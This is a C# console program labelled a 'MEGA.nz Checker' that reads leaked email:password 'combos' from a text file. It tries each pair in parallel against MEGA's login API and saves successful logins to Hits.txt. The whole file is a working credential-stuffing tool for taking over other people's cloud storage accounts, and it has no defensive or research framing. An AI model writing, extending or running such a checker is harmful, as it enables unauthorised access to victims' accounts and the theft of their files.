using CG.Web.MegaApiClient;
using System;
using System.IO;
using System.Threading.Tasks;

namespace MEGA.nz_Checker
{
    class Program
    {
        public static void Main(string[] args)
        {
            File.WriteAllText("Hits.txt", "");

            Console.Title = string.Format("MEGA.nz Checker by ItsYeBoi2016 | Add your combos to \"Combos.txt\", Hits will be Saved to \"Hits.txt\"");

            Program.TestCombo();
            Console.ReadLine();
        }

        private static void CheckLogin(string email, string password)
        {
            MegaApiClient client = new MegaApiClient();
            int hits = 0;

            try
            {
                client.Login(email, password);
                if (!client.IsLoggedIn)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[Bad]  {0}", email);
                    //File.AppendAllText("invalid.txt", string.Concat(email, ":", password, Environment.NewLine));
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine(string.Concat("[Good] ", email, ":", password));
                    File.AppendAllText("Hits.txt", string.Concat(email, ":", password, Environment.NewLine));
                }

                string[] validlines = File.ReadAllLines("Hits.txt");
                foreach (string liner in validlines)
                {
                    hits++;
                }
                Console.Title = string.Format("MEGA.nz Checker by ItsYeBoi2016 | Hits: {0}", hits);

            }
            catch (Exception exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Bad]  {0}", email);
                //File.AppendAllText("invalid.txt", string.Concat(email, ":", password, Environment.NewLine));
                Console.Title = string.Format("MEGA.nz Checker by ItsYeBoi2016 | Hits: {0}", hits);
            }
        }

        public static void TestCombo()
        {
            int combos = 0;
        Again:
            if (File.Exists("Combo.txt"))
            {
                string mois = System.IO.File.ReadAllText("Combo.txt");
                if (mois == "")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("No combos detected, please upload them to \"Combo.txt\"");
                    Console.ResetColor();
                }
                else
                {
                    string[] lines = File.ReadAllLines("Combo.txt");
                    foreach (string line in lines)
                    {
                        combos++;
                    }
                    hey:

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Loaded Combos: {0}", combos);
                    Console.ResetColor();
                    Console.WriteLine("Continue? Y|N");
                    string answer = Console.ReadLine().ToLower();

                    if (answer == "y")
                    {
                        Console.Clear();

                        Parallel.ForEach<string>(File.ReadAllLines("Combo.txt"), (string line) => {
                            string[] split = line.Split(new char[] { ':' });
                            Program.CheckLogin(split[0], split[1]);
                        });
                    }

                    if (answer == "n")
                    {
                        Environment.Exit(0);
                    }

                    if (answer != "n")
                    {
                        Console.Clear();
                        goto hey;
                    }

                    if (answer!= "y")
                    {
                        Console.Clear();
                        goto hey;
                    }
                }
            }
            else
            {
                System.IO.StreamWriter Combo = new System.IO.StreamWriter("Combo.txt");
                Combo.Close();
                Combo.Dispose();
                goto Again;
            }
        }
    }
}
